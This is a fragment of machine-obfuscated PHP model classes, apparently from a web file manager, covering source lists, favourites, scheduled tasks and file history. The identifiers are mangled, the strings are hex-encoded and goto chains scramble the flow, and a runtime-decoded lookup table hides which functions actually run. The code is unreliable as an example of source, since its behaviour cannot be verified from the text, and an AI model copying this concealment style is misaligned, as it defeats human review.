unset($cփ[$B۳[38]]); } protected function _listAppendMeta(&$Aݍ, $f׎ꉣ) { goto bԠ; Bɯ: $C̗ےƽ = array(); foreach ($dŖ as $fۅ) { if (!isset($C̗ےƽ[$fۅ[$f˷Ю[5]]])) { $C̗ےƽ[$fۅ[$f˷Ю[5]]] = array(); } $C̗ےƽ[$fۅ[$f˷Ю[5]]][$fۅ[$f˷Ю[131]]] = $fۅ[$f˷Ю[132]]; } foreach ($Aݍ as &$C̞ק) { $C̞ק[$f˷Ю[133]] = !1; if (isset($C̗ےƽ[$C̞ק[$f˷Ю[5]]])) { $C̞ק[$f˷Ю[133]] = $C̗ےƽ[$C̞ק[$f˷Ю[5]]]; } } goto a; Cȵ砠: $a˃ = array($f˷Ю[36] => array($f˷Ю[37], $f׎ꉣ), $f˷Ю[128] => array($f˷Ю[6], $aА)); $dŖ = $f˷Ю[31]($f˷Ю[129])->{$_SERVER[$Bя[1457]][71]}($f˷Ю[130])->{$_SERVER[$Bя[1457]][4]}($a˃)->{$_SERVER[$Bя[1457]][7]}(); if (!$dŖ) { return; } goto Bɯ; bԠ: $Bя =& $_SERVER[拘]; $f˷Ю =& $_SERVER[$Bя[1457]]; $aА = $f˷Ю[29]($f˷Ю[30], $f˷Ю[117]); goto Cȵ砠; a: } protected function _listAppendSourceInfo(&$f, $cوЉ) { goto fχ; fχ: $Bݒ =& $_SERVER[拘]; $f׆ =& $_SERVER[$Bݒ[1457]]; $e = $f׆[31]($f׆[134])->{$_SERVER[$Bݒ[1457]][33]}(); goto d; A: $fڲ = $f׆[137]($dﾘ, $f׆[5]); foreach ($f as &$aԑ넃) { $aԑ넃[$f׆[49]] = array($f׆[138] => 0, $f׆[139] => 0, $f׆[140] => 0); if (isset($A[$aԑ넃[$f׆[5]]])) { $aԑ넃[$f׆[49]][$f׆[141]] = 1; } if (isset($e؎[$aԑ넃[$f׆[5]]])) { $aԑ넃[$f׆[49]][$f׆[142]] = array(); foreach ($e؎[$aԑ넃[$f׆[5]]] as $BӔ) { $Eňբ = $bґ[$BӔ]; $aԑ넃[$f׆[49]][$f׆[142]][] = array($f׆[143] => $Eňբ[$f׆[40]], $f׆[41] => $Eňբ[$f׆[42]], $f׆[144] => $Eňբ[$f׆[145]]); } } if (isset($fڲ[$aԑ넃[$f׆[5]]])) { $aԑ넃[$f׆[49]][$f׆[146]] = array(); foreach ($fڲ[$aԑ넃[$f׆[5]]] as $A) { $aԑ넃[$f׆[49]][$f׆[146]] = array($f׆[147] => $A[$f׆[148]], $f׆[149] => $A[$f׆[150]], $f׆[151] => $A[$f׆[152]], $f׆[153] => $A[$f׆[154]]); } } } return $f; goto Fްފ; d: $BԊ = $f׆[31]($f׆[50])->{$_SERVER[$Bݒ[1457]][33]}(); $AԄ⧹ = $f׆[31]($f׆[32])->{$_SERVER[$Bݒ[1457]][33]}(); $dﾘ = $f׆[31]($f׆[135])->{$_SERVER[$Bݒ[1457]][136]}(); goto AΏ; AΏ: $bґ = $f׆[15]($e, $f׆[40]); $e؎ = $f׆[137]($BԊ, $f׆[16], $f׆[51]); $A = $f׆[15]($AԄ⧹, $f׆[16]); goto A; Fްފ: } protected function _listAppendChildren(&$B, $Fǃ) { goto EϿե; dຸ: $E˕ = $this->tablePrefix . $this->tableName; for ($Bᥗ = 0; $Bᥗ < $F; $Bᥗ++) { if ($B[$Bᥗ][$aլ[19]]) { $eٍ = $B[$Bᥗ][$aլ[5]]; $Fȹ .= "\123\105\114\105\103\x54\40\52\x20\x46\x52\x4f\115\x20\50\123\x45\x4c\105\x43\x54\40\47{$eٍ}\x5f\150\141\x73\106\x69\154\x65\x27\x20\141\163\x20\150\x61\163\40\106\x52\117\115\x20\140{$E˕}\x60\x20\xa\x9\x9\11\x9\x9\167\150\x65\x72\x65\x20\160\141\162\x65\x6e\164\x49\104\x3d{$eٍ}\40\141\156\x64\x20\151\x73\x46\x6f\x6c\x64\145\x72\75\x30\x20\x61\156\x64\x20\151\x73\x44\145\154\x65\164\145\x3d\x30\x20\154\151\x6d\x69\x74\x20\x31\51\x20\x61\x73\x20\x74\x62\61\x5f{$eٍ}\x20\x75\156\151\x6f\156\40\141\x6c\154\40\xa\11\x9\11\11\x9\123\x45\x4c\x45\x43\x54\40\x2a\40\106\x52\117\x4d\x20\50\123\x45\114\x45\103\x54\40\x27{$eٍ}\137\x68\141\x73\106\x6f\154\144\x65\162\x27\40\141\163\x20\x68\141\163\106\x69\x6c\x65\x20\106\x52\117\115\x20\140{$E˕}\140\x20\12\x9\x9\x9\x9\11\x77\150\145\x72\145\40\160\x61\x72\x65\156\164\111\x44\x3d{$eٍ}\x20\141\156\144\40\x69\163\106\157\x6c\144\x65\162\75\x31\40\x61\x6e\144\40\151\x73\x44\x65\154\145\x74\145\x3d\x30\40\154\x69\155\x69\x74\x20\x31\x29\x20\x61\x73\x20\x74\x62\62\x5f{$eٍ}\40\165\156\151\x6f\x6e\x20\141\154\154\40"; } if (($aլ[78]($Fȹ) >= $Aȉ || $Bᥗ == $F - 1) && $Fȹ) { $Fȹ = $aլ[157]($Fȹ, 0, -$aլ[78]($aլ[158])); $AКʼ = $this->{$_SERVER[$bӎ[1457]][159]}($Fȹ); $EΎ = $aլ[160]($EΎ, $AКʼ); $Fȹ = $aլ[2]; } } $EΎ = $aլ[15]($EΎ, $aլ[161], $aլ[161]); goto B٢; B٢: foreach ($B as &$Bɔ) { if ($Bɔ[$aլ[19]]) { unset($Bɔ[$aլ[25]]); $Bɔ[$aլ[162]] = isset($EΎ[$Bɔ[$aլ[5]] . $aլ[163]]); $Bɔ[$aլ[164]] = isset($EΎ[$Bɔ[$aլ[5]] . $aլ[165]]); } } goto A̵; EϿե: $bӎ =& $_SERVER[拘]; $aլ =& $_SERVER[$bӎ[1457]]; $Fȹ = $aլ[155]; goto a; a: $EΎ = array(); $Aȉ = 1024 * 50; $F = $aլ[156]($B); goto dຸ; A̵: } protected function _listAppendAuth(&$a) { goto f; aވ: foreach ($a as $EѴ) { if ($EѴ[$c䊟[22]] == self::TYPE_GROUP) { $F˭[] = $EѴ[$c䊟[5]]; } } if (!$F˭) { return; } $bƜ = $c䊟[15]($a, $c䊟[5]); goto fԣ; f: $c熳 =& $_SERVER[拘]; $c䊟 =& $_SERVER[$c熳[1457]]; $F˭ = array(); goto aވ; fԣ: $Aҕ = $c䊟[31]($c䊟[166])->{$_SERVER[$c熳[1457]][167]}($F˭, $bƜ); foreach ($a as &$EѴ) { $EѴ[$c䊟[168]] = $Aҕ[$EѴ[$c䊟[5]]]; } return; goto f猒; f猒: } protected function _listAppendPath(&$Fī) { goto A⌄; A⌄: $f =& $_SERVER[拘]; $CԟП =& $_SERVER[$f[1457]]; $dÂ = array(); goto fվ; D: if ($c) { $b = array($CԟП[36] => array($CԟП[37], $c)); $dȹ = $this->{$_SERVER[$f[1457]][71]}($CԟП[171])->{$_SERVER[$f[1457]][4]}($b)->{$_SERVER[$f[1457]][7]}(); $C = $CԟП[15]($dȹ, $CԟП[5], $CԟП[42]); $dÂ = $CԟП[172]($dÂ, $C); } foreach ($Fī as &$b䢾Ă) { goto d넻; A금: if ($b䢾Ă[$CԟП[95]] == $CԟП[177]) { $b䢾Ă[$CԟП[42]] = $CԟП[57]($b䢾Ă[$CԟП[175]], $CԟП[174]); } goto Cۡʃ; d넻: $fҹ = $this->{$_SERVER[$f[1457]][169]}($b䢾Ă[$CԟП[98]]); $eܦǨ = $this->{$_SERVER[$f[1457]][173]}($b䢾Ă, $fҹ); foreach ($fҹ as $FϕӖ) { if (isset($dÂ[$FϕӖ])) { $eܦǨ .= $dÂ[$FϕӖ] . $CԟП[174]; } } goto b; b: if ($fҹ) { $eܦǨ .= $b䢾Ă[$CԟП[42]]; } if ($b䢾Ă[$CԟП[19]]) { $eܦǨ .= $CԟП[174]; } $b䢾Ă[$CԟП[175]] = $CԟП[79]($CԟП[176], $CԟП[174], $eܦǨ); goto A금; Cۡʃ: } goto A캂; fվ: foreach ($Fī as &$b䢾Ă) { $dÂ[$b䢾Ă[$CԟП[5]]] = $b䢾Ă[$CԟП[42]]; $fҹ = $this->{$_SERVER[$f[1457]][169]}($b䢾Ă[$CԟП[98]]); $CԟП[170]($fҹ); foreach ($fҹ as $FϕӖ) { if (!isset($dÂ[$FϕӖ])) { $dÂ[$FϕӖ] = 0; } } } $c = array(); foreach ($dÂ as $fލ => $bí) { if (!$bí) { $c[] = $fލ; } } goto D; A캂: } protected function _listAppendPathRoot(&$aͅ, $A) { goto c; eԄ: return $cٺّ; goto f; c: $aᡍ =& $_SERVER[拘]; $a =& $_SERVER[$aᡍ[1457]]; $cٺّ = $a[2]; goto fҭ; fҭ: if ($aͅ[$a[22]] == self::TYPE_USER) { if ($aͅ[$a[178]] == USER_ID) { $cٺّ = $a[179]($a[180]); if (!$A) { $aͅ[$a[42]] = $cٺّ; } } else { $Bɍ = $a[31]($a[181])->{$_SERVER[$aᡍ[1457]][182]}($aͅ[$a[178]]); $cٺّ = $a[183] . $Bɍ[$a[42]] . $a[184]; } } if ($aͅ[$a[22]] == self::TYPE_GROUP) { $Bɍ = $a[31]($a[185])->{$_SERVER[$aᡍ[1457]][182]}($aͅ[$a[178]]); $cٺّ = $Bɍ[$a[42]]; } $cٺّ = $cٺّ ? $a[174] . $cٺّ . $a[174] : $a[174]; goto eԄ; f: } protected function _listAppendUser(&$eŜ) { goto aҢ; bϨ: $F = $F޺[15]($eŜ, $F޺[2], $F޺[109]); $eΡ = $F޺[160]($d, $F); $A = $F޺[31]($F޺[186])->{$_SERVER[$FК[1457]][187]}($eΡ); goto a; aҢ: $FК =& $_SERVER[拘]; $F޺ =& $_SERVER[$FК[1457]]; $d = $F޺[15]($eŜ, $F޺[2], $F޺[108]); goto bϨ; a: foreach ($eŜ as &$c) { $cѩ = $c[$F޺[108]]; $c[$F޺[108]] = $A[$cѩ] ? $A[$cѩ] : !1; $cѩ = $c[$F޺[109]]; $c[$F޺[109]] = $A[$cѩ] ? $A[$cѩ] : !1; } goto C嫗؍; C嫗؍: } public function parentLevelArray($a) { $f꧉ =& $_SERVER[$_SERVER[拘][1457]]; $a = $f꧉[29]($f꧉[30], $f꧉[57]($a, $f꧉[30])); $a = $f꧉[188]($a, $f꧉[177]); return $a; } public function listAll($b) { goto C; A튑: $dѓ = array($Dǘ禱[189] => array($Dǘ禱[85], $e͐[$Dǘ禱[98]] . $b . $Dǘ禱[99]), $Dǘ禱[190] => 0); $d = $Dǘ禱[191]; $Eǂ = "\x4c\x45\106\124\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x69\157\137\x66\x69\x6c\145\40\146\x69\x6c\145\x20\x6f\x6e\40\x73\x6f\165\x72\x63\145\56\146\x69\x6c\x65\111\x44\40\75\40\x66\151\154\x65\56\146\x69\154\x65\x49\104"; goto FÆ; FÆ: $F򂒌 = $this->{$_SERVER[$a[1457]][67]}($Dǘ禱[68])->{$_SERVER[$a[1457]][71]}($d)->{$_SERVER[$a[1457]][4]}($dѓ)->{$_SERVER[$a[1457]][94]}($Eǂ)->{$_SERVER[$a[1457]][7]}(); $F򂒌 = $Dǘ禱[15]($F򂒌, $Dǘ禱[5]); $d = "\x2f{$e͐[$Dǘ禱[42]]}\57"; goto D; E率۽: foreach ($F򂒌 as $C => $Fަ) { goto aꎍ; aꎍ: $DӇ = $this->{$_SERVER[$a[1457]][169]}($Fަ[$Dǘ禱[98]]); $Dǘ禱[170]($DӇ); $bڙ׻ = $d; goto bΉɰ; bΉɰ: for ($f = 0; $f < $Dǘ禱[156]($DӇ); $f++) { $bڙ׻ .= $F򂒌[$DӇ[$f]][$Dǘ禱[42]] . $Dǘ禱[174]; } $bڙ׻ .= $Fަ[$Dǘ禱[42]]; if ($Fަ[$Dǘ禱[19]]) { $bڙ׻ .= $Dǘ禱[174]; } goto aս; aս: $b֍ = array($Dǘ禱[43] => $Dǘ禱[79]($Dǘ禱[176], $Dǘ禱[174], $bڙ׻), $Dǘ禱[192] => $Dǘ禱[194]($Fަ[$Dǘ禱[19]])); if (!$Fަ[$Dǘ禱[19]]) { $b֍[$Dǘ禱[21]] = $Fަ[$Dǘ禱[16]]; $b֍[$Dǘ禱[106]] = $Fަ[$Dǘ禱[106]]; } $c˙[] = $b֍; goto a瓌; a瓌: } return $c˙; goto fЉЬ; C: $a =& $_SERVER[拘]; $Dǘ禱 =& $_SERVER[$a[1457]]; $e͐ = $this->{$_SERVER[$a[1457]][96]}($b); goto A튑; D: $d = $d == $Dǘ禱[176] ? $Dǘ禱[174] : $d; $c˙ = array(array($Dǘ禱[43] => $d, $Dǘ禱[192] => 1, $Dǘ禱[193] => 0)); if ($d == $Dǘ禱[174]) { $c˙ = array(); } goto E率۽; fЉЬ: } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\x74\141\x73\x6b\x4c\151\x73\164"; public $field = array("\156\x61\155\x65", "\x72\x65\x70\x65\x61\x74\124\151\155\x65", "\x66\x72\x6f\x6d\x54\x69\155\145", "\x73\x79\163\164\145\155", "\x65\x76\x65\156\x74", "\x70\x61\x72\141\155", "\x65\x6e\141\x62\x6c\x65", "\154\141\x73\x74\122\165\156"); public function listData($d̆ = false, $B = "\x73\x6f\162\164", $Aݩް = false) { return parent::listData($d̆, $B, $Aݩް); } public function add($cƌ) { $bȴ =& $_SERVER[拘]; $D = $this->{$_SERVER[拘][1461]}($cƌ[$bȴ[375]]); if ($D) { return !1; } $cƌ[$bȴ[1462]] = 0; return parent::insert($cƌ); } public function update($C󉸯, $fѸ) { $bݥ =& $_SERVER[拘]; $Cԛ = $this->{$_SERVER[拘][504]}($C󉸯); $E뗰 = $this->{$_SERVER[拘][1461]}($fѸ[$bݥ[375]]); if (!$Cԛ || $E뗰 && $E뗰[$bݥ[414]] != $Cԛ[$bݥ[414]]) { return !1; } return parent::update($C󉸯, $fѸ); } public function remove($F萊) { $Aˬ = $this->{$_SERVER[拘][504]}($F萊); if (!$Aˬ || $Aˬ[$_SERVER[拘][460]]) { return !1; } return parent::remove($F萊); } public function enable($Aὔ) { $e쑭 =& $_SERVER[拘]; $f = $this->{$_SERVER[拘][504]}($Aὔ); $A = !$f[$e쑭[1463]]; return $this->{$_SERVER[拘][1038]}($Aὔ, array($e쑭[1464] => $A)); } public function run($fɌŸ) { $e֑ =& $_SERVER[拘]; return $this->{$_SERVER[拘][1038]}($fɌŸ, array($e֑[1465] => $e֑[50]())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($cº) { $f =& $_SERVER[拘]; return array($f[1443] => array(USER_ID, $f[1466])); } protected function listData() { $e =& $_SERVER[拘]; $f䟘 = array($e[1445] => USER_ID, $e[1446] => 0); $c͉χ = $e[1467]; $a = $this->{$_SERVER[拘][1164]}($c͉χ)->{$_SERVER[拘][501]}($f䟘)->{$_SERVER[拘][1450]}($e[1468])->{$_SERVER[拘][1042]}(); return $a ? $a : array(); } protected function listView() { goto c; c: $Cւԛ =& $_SERVER[拘]; $D٘ = $this->{$_SERVER[拘][504]}(); $BÉ = $Cւԛ[1442]($D٘, $Cւԛ[400], $Cւԛ[1354]); goto dϭ; ā: $Fۢ = $Cւԛ[413]($Fۢ, $Cւԛ[499]); foreach ($D٘ as $C => $E) { $a = $Fۢ[$E[$Cւԛ[40]]]; $a = $a ? $a : array(); $D٘[$C] = $Cւԛ[153]($a, $E); } return $this->{$_SERVER[拘][1469]}($D٘); goto DΤ; dϭ: $E֯ = $Cւԛ[413]($BÉ, $Cւԛ[67], $Cւԛ[40]); if (!$E֯) { return $this->{$_SERVER[拘][1469]}($D٘); } $FҴք = 2000; goto DŪ; DŪ: $d袿 = array($Cւԛ[1470] => array($Cւԛ[1471], $E֯)); $Fۢ = $Cւԛ[64]($Cւԛ[474])->{$_SERVER[拘][1472]}($d袿, $FҴք); $Fۢ = $Cւԛ[153]($Fۢ[$Cւԛ[398]], $Fۢ[$Cւԛ[399]]); goto ā; DΤ: } private function _checkExists($A؆) { $b质 =& $_SERVER[拘]; foreach ($A؆ as &$E⪕) { if ($E⪕[$b质[400]] == $b质[1354] && $E⪕[$b质[499]]) { $E⪕[$b质[400]] = $E⪕[$b质[503]] == $b质[162] ? $b质[557] : $b质[18]; $E⪕[$b质[40]] = KodIO::make($E⪕[$b质[40]]); continue; } if ($E⪕[$b质[400]] == $b质[1354]) { $E⪕[$b质[400]] = $b质[557]; $E⪕[$b质[1473]] = !1; $E⪕[$b质[40]] = KodIO::make($E⪕[$b质[40]]); } else { goto dׯߩ; dׯߩ: $f߸ = KodIO::parse($E⪕[$b质[40]]); if ($f߸[$b质[450]]) { $E⪕[$b质[1474]] = !0; $E⪕[$b质[1475]] = !0; continue; } $bσ = IO::info($E⪕[$b质[40]]); goto eѨ; A݉: if ($E⪕[$b质[400]] == $b质[18]) { $E⪕[$b质[565]] = $b质[708]($E⪕[$b质[375]]); } goto cϕ; eѨ: if (!$bσ) { $bσ = array($b质[1473] => !1); } $bσ[$b质[375]] = $E⪕[$b质[375]]; $E⪕ = $b质[153]($E⪕, $bσ); goto A݉; cϕ: } } return $A؆; } protected function addFav($c儒, $E׵Ÿ = '', $bޙއ = "\x73\157\165\x72\143\x65") { goto cُ; eߴᲱ: return $this->{$_SERVER[拘][63]}($fǐ); goto e; A칣: if (!$E׵Ÿ && $bޙއ == $e２[1354]) { $Bȿ = $e２[64]($e２[480])->{$_SERVER[拘][501]}(array($e２[1470] => $c儒))->{$_SERVER[拘][502]}(); if (!$Bȿ) { return !1; } $E׵Ÿ = $Bȿ[$e２[375]]; } $E׵Ÿ = $this->{$_SERVER[拘][1477]}($E׵Ÿ); $fǐ = array($e２[1445] => USER_ID, $e２[1446] => 0, $e２[1453] => $E׵Ÿ, $e２[1452] => $c儒, $e２[445] => $bޙއ, $e２[1454] => $FǖӋ + 1); goto eߴᲱ; A㣃: $a֊ = array($e２[1445] => USER_ID, $e２[1446] => 0); $FǖӋ = $this->{$_SERVER[拘][501]}($a֊)->{$_SERVER[拘][1141]}($e２[1476]); if (!$FǖӋ) { $FǖӋ = 0; } goto A칣; cُ: $e２ =& $_SERVER[拘]; $a֊ = array($e２[1445] => USER_ID, $e２[1446] => 0, $e２[445] => $bޙއ, $e２[1452] => $c儒); if ($FÊׄ = $this->{$_SERVER[拘][501]}($a֊)->{$_SERVER[拘][502]}()) { return !1; } goto A㣃; e: } protected function remove($BѠ) { $fɸϚ =& $_SERVER[拘]; $fῷ = array($fɸϚ[1445] => USER_ID, $fɸϚ[447] => $BѠ); return $this->{$_SERVER[拘][501]}($fῷ)->{$_SERVER[拘][308]}(); } protected function removeByName($a) { $f =& $_SERVER[拘]; $d߽Ɏ = array($f[1445] => USER_ID, $f[1453] => $a, $f[1446] => 0); return $this->{$_SERVER[拘][501]}($d߽Ɏ)->{$_SERVER[拘][308]}(); } protected function rename($d, $d㰰) { $C =& $_SERVER[拘]; if ($d == $d㰰) { return !1; } $Eꪫ = $this->{$_SERVER[拘][1477]}($d㰰); if ($d㰰 != $Eꪫ) { return !1; } $E = array($C[1445] => USER_ID, $C[1446] => 0, $C[375] => $d); return $this->{$_SERVER[拘][501]}($E)->{$_SERVER[拘][1062]}(array($C[375] => $d㰰)); } protected function resetSort($bǷ) { $F܆ =& $_SERVER[拘]; $bذ = array($F܆[1445] => USER_ID); for ($Fۅ = 0; $Fۅ < $F܆[37]($bǷ); $Fۅ++) { $bذ[$F܆[447]] = $bǷ[$Fۅ]; $this->{$_SERVER[拘][501]}($bذ)->{$_SERVER[拘][1062]}(array($F܆[1454] => $Fۅ + 1)); } return !0; } protected function moveTop($B) { goto a٨; a٨: $Dզٟ =& $_SERVER[拘]; $F = array($Dզٟ[1445] => USER_ID, $Dզٟ[1446] => 0); $Cï = $this->{$_SERVER[拘][501]}($F)->{$_SERVER[拘][501]}(array($Dզٟ[375] => $B))->{$_SERVER[拘][502]}(); goto dڶϽ; B֔: return $this->{$_SERVER[拘][1479]}($B); goto dأ·; dڶϽ: if (!$Cï) { return; } $B = $this->{$_SERVER[拘][1164]}($Dզٟ[414])->{$_SERVER[拘][501]}($F)->{$_SERVER[拘][1450]}($Dզٟ[1468])->{$_SERVER[拘][1042]}(); $B = $Dզٟ[413]($B, $Dզٟ[67], $Dզٟ[414]); goto fűӍ; fűӍ: $bޑߊ = $B; $B = $Dզٟ[1478]($B, $Cï[$Dզٟ[414]]); $Dզٟ[1096]($B, $Cï[$Dզٟ[414]]); goto B֔; dأ·: } protected function moveBottom($D) { $B =& $_SERVER[拘]; $Dġ = array($B[1445] => USER_ID, $B[1446] => 0); $Cꤊ = $this->{$_SERVER[拘][501]}($Dġ)->{$_SERVER[拘][1141]}($B[1476]); $a҆Ȕߡ = array($B[1476] => $Cꤊ + 1); return $this->{$_SERVER[拘][501]}($Dġ)->{$_SERVER[拘][501]}(array($B[375] => $D))->{$_SERVER[拘][1062]}($a҆Ȕߡ); } private function getAutoName($b) { goto aԩ; dɱ: return $b . "\x28{$C}\x29"; goto aϑ; aԩ: $C㬍 =& $_SERVER[拘]; $C = array($C㬍[1445] => USER_ID, $C㬍[1446] => 0); $bЍ = $this->{$_SERVER[拘][1164]}($C㬍[375])->{$_SERVER[拘][501]}($C)->{$_SERVER[拘][1042]}(); goto a; a: $bЍ = $C㬍[413]($bЍ, $C㬍[67], $C㬍[375]); if (!$bЍ || !$C㬍[176]($b, $bЍ)) { return $b; } for ($C = 0; $C < $C㬍[37]($bЍ); $C++) { if (!$C㬍[176]($b . "\x28{$C}\51", $bЍ)) { return $b . "\x28{$C}\x29"; } } goto dɱ; aϑ: } } goto Eƭԓ; fٞ: $_SERVER[拘][0]($_SERVER[拘][1], $_SERVER[拘][2]); $_SERVER[$_SERVER[拘][3]] = $_SERVER[拘][4]($_SERVER[拘][5], $_SERVER[拘][6]($_SERVER[拘][7]($_SERVER[拘][8], 10, -8))); function Model($fÂ = '', $AӢᗎ = '', $b = '') { goto e߼օ; Cɚ: if (isset($FӖ[$bǿ])) { return $FӖ[$bǿ]; } if ($fÂ) { $fÂ = $F􅱛[2]($fÂ[0]) . $F􅱛[3]($fÂ, 1); $EӦ = $fÂ . $F􅱛[4]; if ($F􅱛[5]($EӦ)) { $FӖ[$bǿ] = new $EӦ(); return $FӖ[$bǿ]; } } $FӖ[$bǿ] = new ModelBase($fÂ, $AӢᗎ, $b); goto aվ; e߼օ: $F􅱛 =& $_SERVER[$_SERVER[拘][3]]; static $FӖ = array(); $bǿ = $F􅱛[0]($AӢᗎ . $F􅱛[1] . $fÂ); goto Cɚ; aվ: return $FӖ[$bǿ]; goto f; f: } goto B; B: function Action($d費 = '') { goto e; Bϱ: $b䶸ϝ = $f[0]($DӇ); if (isset($d䗎҅[$b䶸ϝ])) { return $d䗎҅[$b䶸ϝ]; } if ($f[22]($dĲ)) { include_once $dĲ; } goto d䜗; e: $f =& $_SERVER[$_SERVER[拘][3]]; static $d䗎҅ = array(); $d費 = $f[7]($d費, $f[8]); goto F롉; d䜗: if (!$f[5]($DӇ)) { $f[23]($f[24] . $d費 . $f[25] . $DӇ . $f[26], !1); } $d䗎҅[$b䶸ϝ] = new $DӇ(); return $d䗎҅[$b䶸ϝ]; goto Fۼ; F롉: $A = $f[9]($f[10], $d費); $aڝ߄ = $f[0]($A[0]); if ($f[3]($aڝ߄, -6) == $f[11]) { $d費 = $f[3]($A[0], 0, -6); $DӇ = $d費 . $f[12]; $dĲ = $f[13]; if ($f[3]($f[0]($A[1]), -5) == $f[14]) { $DӇ = $d費 . $A[1]; $dĲ = $f[15] . $A[1] . $f[16]; } else { if ($f[17]($A) == 3) { $DӇ = $d費 . $A[1] . $A[2]; $dĲ = $f[18] . $A[1] . $f[19] . $A[2] . $f[16]; } } $dĲ = PLUGIN_DIR . $d費 . $f[8] . $dĲ; } else { if ($f[3]($aڝ߄, -5) == $f[14]) { $d費 = $f[3]($A[0], 0, -5); return $f[20]($d費); } else { $DӇ = $A[0] . $A[1]; $dĲ = CONTROLLER_DIR . $A[0] . $f[8] . $A[1] . $f[21]; } } goto Bϱ; Fۼ: } function ActionApply($EՋ, $Eۺ = array()) { goto C; Aَ: $AӜ = $a蟠[30]($EՋ, $a蟠[10]); $fۅ = $a蟠[3]($EՋ, 0, $AӜ); $A = $a蟠[3]($EՋ, $AӜ + 1); goto e鱬; e鱬: $B = $a蟠[31]($fۅ); if (!$a蟠[32]($B, $A)) { $a蟠[23]($EՋ . $a蟠[33], !1); } $Bڈ = $a蟠[29](array($B, $A), $Eۺ); goto e; C: $a蟠 =& $_SERVER[$_SERVER[拘][3]]; if (!$a蟠[27]($EՋ)) { return; } if ($a蟠[28]($EՋ)) { return $a蟠[29]($EՋ, $Eۺ); } goto Aَ; e: return $Bڈ; goto F; F: } function ActionCall($F) { $eʘÙ =& $_SERVER[$_SERVER[拘][3]]; $aЏ = $eʘÙ[34](func_get_args(), 1); return $eʘÙ[35]($F, $aЏ); } goto aϐ; e: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\162\x63\145\137\150\x69\163\x74\x6f\x72\171"; public function addHistory($A籒ګ, $f䃦 = '') { $A׹ =& $_SERVER[拘]; $dѵ =& $_SERVER[$A׹[1698]]; $a = array($dѵ[0] => $A籒ګ[$dѵ[1]], $dѵ[2] => isset($A籒ګ[$dѵ[3]]) ? $A籒ګ[$dѵ[3]] : $A籒ګ[$dѵ[4]], $dѵ[5] => $A籒ګ[$dѵ[6]], $dѵ[7] => $A籒ګ[$dѵ[8]], $dѵ[9] => $f䃦); $this->{$_SERVER[$A׹[1698]][10]}($a[$dѵ[1]]); $this->{$_SERVER[$A׹[1698]][11]}($a); } private function historyAutoClear($FҦ) { goto C; C: $Dͷ =& $_SERVER[拘]; $Cč =& $_SERVER[$Dͷ[1698]]; $Aη = $Cč[12]($Cč[13])->{$_SERVER[$Dͷ[1698]][14]}($Cč[15]); goto D; D: $eΌ = $Aη == $Cč[16] ? 3 : 1000; $D = $eΌ - 1; if ($D >= 200) { return; } goto aʹڐה; CÕλ: $this->{$_SERVER[$Dͷ[1698]][19]}($bϗƙ)->{$_SERVER[$Dͷ[1698]][32]}(); goto fÊ; E֘: $D = $Cč[24]($F, $Cč[25], $Cč[26]); $D = $Cč[27]($D, $D); $Eҵ滠 = $Cč[24]($F, $Cč[25], $Cč[6]); goto b; b: $Eҵ滠 = $Cč[27]($Eҵ滠, $D); $bϗƙ = array($Cč[28] => array($Cč[29], $D)); $Cč[12]($Cč[30])->{$_SERVER[$Dͷ[1698]][31]}($Eҵ滠); goto CÕλ; aʹڐה: $bϗƙ = array($Cč[0] => $FҦ); $F = $this->{$_SERVER[$Dͷ[1698]][17]}($Cč[18])->{$_SERVER[$Dͷ[1698]][19]}($bϗƙ)->{$_SERVER[$Dͷ[1698]][20]}($Cč[21])->{$_SERVER[$Dͷ[1698]][22]}(); if ($D >= $Cč[23]($F)) { return; } goto E֘; fÊ: } public function listData($eϖ) { goto eٔ; eٔ: $FΎ =& $_SERVER[拘]; $d =& $_SERVER[$FΎ[1698]]; $fʮ攵 = array($d[0] => $eϖ); goto C; C: $F┪ = $d[33]; $bڑ¿ = $this->{$_SERVER[$FΎ[1698]][17]}($F┪)->{$_SERVER[$FΎ[1698]][19]}($fʮ攵)->{$_SERVER[$FΎ[1698]][20]}($d[21])->{$_SERVER[$FΎ[1698]][34]}(); $this->{$_SERVER[$FΎ[1698]][35]}($bڑ¿[$d[36]]); goto e; e: $d = $d[12]($d[13])->{$_SERVER[$FΎ[1698]][14]}($d[15]); if ($d == $d[16]) { $bڑ¿[$d[36]] = $d[27]($bڑ¿[$d[36]], 0, 3); $bڑ¿[$d[37]] = array($d[38] => 1, $d[39] => 20, $d[40] => 1, $d[41] => 3); } return $bڑ¿; goto E暭ب; E暭ب: } protected function _listAppendUser(&$F) { $Cռͽ =& $_SERVER[拘]; $Dϑ렷 =& $_SERVER[$Cռͽ[1698]]; $bꂲ = $Dϑ렷[24]($F, $Dϑ렷[25], $Dϑ렷[42]); $Cꊓ = $Dϑ렷[12]($Dϑ렷[43])->{$_SERVER[$Cռͽ[1698]][44]}($bꂲ); foreach ($F as &$cۄ) { $D = $cۄ[$Dϑ렷[42]]; $cۄ[$Dϑ렷[4]] = $Cꊓ[$D] ? $Cꊓ[$D] : !1; } } public function fileInfo($BʞƇ) { $Fׅ =& $_SERVER[拘]; $D =& $_SERVER[$Fׅ[1698]]; $B = $this->tablePrefix; $d = "{$B}\x69\x6f\x5f\x66\x69\154\145\x20\146\151\154\145\163\40\x6f\x6e\40\x66\151\x6c\x65\163\56\146\x69\x6c\x65\x49\x44\40\x3d\x20\150\x69\x73\x74\x6f\x72\x79\56\146\x69\x6c\x65\111\104"; return $this->{$_SERVER[$Fׅ[1698]][45]}($D[46])->{$_SERVER[$Fׅ[1698]][19]}(array($D[28] => $BʞƇ))->{$_SERVER[$Fׅ[1698]][47]}($d, $D[48])->{$_SERVER[$Fׅ[1698]][49]}(); } public function removeItem($bҤ) { $BԈ =& $_SERVER[拘]; $Dϛ =& $_SERVER[$BԈ[1698]]; $Dܻ = array($Dϛ[28] => $bҤ); $D = $this->{$_SERVER[$BԈ[1698]][19]}($Dܻ)->{$_SERVER[$BԈ[1698]][49]}(); if ($D) { $Dϛ[12]($Dϛ[30])->{$_SERVER[$BԈ[1698]][31]}($D[$Dϛ[6]]); return $this->{$_SERVER[$BԈ[1698]][19]}($Dܻ)->{$_SERVER[$BԈ[1698]][32]}(); } return !1; } public function removeBySource($D) { goto Cσ; f: if (!$ḇ[50]($D)) { $D = array($D); } $AČ = array($ḇ[0] => array($ḇ[29], $D)); $a = 